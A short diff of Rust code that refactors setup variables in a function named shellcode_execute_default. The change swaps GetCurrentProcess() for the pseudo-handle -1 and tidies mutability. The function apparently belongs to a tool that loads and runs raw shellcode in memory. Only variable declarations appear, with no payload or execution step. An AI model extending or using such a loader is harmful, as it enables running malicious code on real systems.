@@ -15,12 +15,12 @@ use std::ffi::c_void;
 #[cfg(feature = "ShellcodeExecuteDefault")]
 pub fn shellcode_execute_default(bytes_to_load: Vec<u8>) -> bool
 {
-
-    let mut process_handle: HANDLE = unsafe { GetCurrentProcess() };
+    // Use -1 as handle for current process (standard Windows convention)
+    let process_handle: HANDLE = HANDLE(-1isize);
     let mut base_address: *mut c_void = std::ptr::null_mut();
 
     let mut region_size: usize = bytes_to_load.len();
-    let mut allocation_type: u32 = 0x1000;
+    let allocation_type: u32 = 0x1000;
     let mut return_value: i32;
     let mut bytes_written: usize = 0;
     let mut oldprotect: u32 = 0;
